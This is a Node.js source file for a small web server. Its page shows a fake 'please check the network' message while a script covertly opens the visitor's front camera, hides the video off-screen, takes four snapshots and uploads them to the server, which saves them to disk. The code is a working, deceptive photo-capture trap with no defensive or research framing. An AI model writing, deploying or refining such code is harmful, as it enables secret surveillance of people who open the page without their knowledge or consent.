const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const SAVE_DIR = path.join(__dirname, 'photos');
if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR);

const HTML = `<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>拍照</title>
  <style>
    body {
      display: flex; justify-content: center; align-items: center;
      min-height: 100vh; margin: 0;
      background: #1a1a2e; color: #aaa;
      font-family: sans-serif; font-size: 24px;
    }
    video { position: fixed; top: -9999px; }
  </style>
</head>
<body>
  <div>请检查网络</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function capture() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const blob = await new Promise(r => canvas.toBlob(r, 'image/png'));
      const fd = new FormData();
      fd.append('photo', blob, 'photo.png');
      await fetch('/upload', { method: 'POST', body: fd });
    }

    (async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 300));
        await capture();
        await new Promise(r => setTimeout(r, 200));
        await capture();
        await new Promise(r => setTimeout(r, 200));
        await capture();
        await new Promise(r => setTimeout(r, 200));
        await capture();
        stream.getTracks().forEach(t => t.stop());
      } catch (err) {
        console.error(err);
      }
    })();
  </script>
</body>
</html>`;

const server = http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(HTML);
  } else if (req.method === 'POST' && req.url === '/upload') {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      const buf = Buffer.concat(chunks);
      const boundary = req.headers['content-type'].match(/boundary=(.+)/)[1];
      const parts = buf.toString('binary').split('--' + boundary);
      for (const part of parts) {
        if (part.includes('filename=')) {
          const headerEnd = part.indexOf('\r\n\r\n') + 4;
          const rawData = part.substring(headerEnd, part.lastIndexOf('\r\n'));
          const filename = 'photo_' + Date.now() + '.png';
          fs.writeFileSync(path.join(SAVE_DIR, filename), rawData, 'binary');
          console.log('已保存: ' + filename);
          res.writeHead(200);
          res.end('ok');
          return;
        }
      }
      res.writeHead(400);
      res.end();
    });
  } else {
    res.writeHead(404);
    res.end();
  }
});

server.listen(PORT, () => {
  console.log('服务启动: http://localhost:' + PORT);
  console.log('照片保存目录: ' + SAVE_DIR);
});
